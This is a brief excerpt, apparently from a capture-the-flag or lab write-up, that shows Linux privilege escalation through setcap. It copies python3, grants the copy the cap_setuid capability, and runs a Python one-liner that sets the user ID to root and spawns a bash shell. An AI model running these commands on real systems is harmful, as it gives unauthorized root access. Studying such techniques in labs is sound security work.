- - -
### /sbin/setcap

```sh
cp /usr/bin/python3 /tmp/
```

```sh
setcap cap_setuid+ep /home/annie/python3
```

```python
./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

![Imgur](https://i.imgur.com/Vd6FeeS.png)
![Imgur](https://i.imgur.com/utN0jT7.png)

- - -

